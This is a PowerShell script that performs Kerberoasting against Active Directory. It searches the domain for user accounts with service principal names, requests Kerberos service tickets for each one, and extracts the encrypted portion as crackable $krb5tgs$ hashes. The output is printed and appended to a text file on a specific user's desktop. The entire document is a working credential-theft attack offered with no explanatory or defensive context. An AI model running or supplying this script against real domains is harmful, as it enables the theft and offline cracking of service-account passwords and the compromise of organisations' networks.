Add-Type -AssemblyName System.IdentityModel
$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
$CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
$GC = $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain

$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = "LDAP://" + $GC
$searcher.PageSize = 5000
$searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
$searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
$searcher.PropertiesToLoad.Add("name") | Out-Null
$searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
$searcher.PropertiesToLoad.Add("memberof") | Out-Null
$searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
$searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null

$searcher.SearchScope = "Subtree"
$results = $searcher.FindAll()

foreach($result in $results) {
	foreach($spn in $result.Properties["serviceprincipalname"]) {
		$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
		$stream = $ticket.GetRequest()
		$hexstr = [System.BitConverter]::ToString($stream) -replace '-'
		$samaccountname = $result.Properties["samaccountname"] | Out-String
        $samaccountname = $samaccountname -replace "`n", ""
		$distinguishedname = $result.Properties["distinguishedname"] | Out-String
		if($hexstr -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
			$Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
            $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
			$CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
			$Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
			$userdomain = $distinguishedname.SubString($distinguishedname.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
			$outhash = "`$krb5tgs`$$($Etype)`$*$samaccountname`$$userdomain`$$($ticket.ServicePrincipalName)*`$$hash" -replace "`n", "" -replace "`r", ""
			Write-Output $outhash
			$outhash | Out-File C:\Users\cdarnell\Desktop\spns.txt -Append
		}
	}
}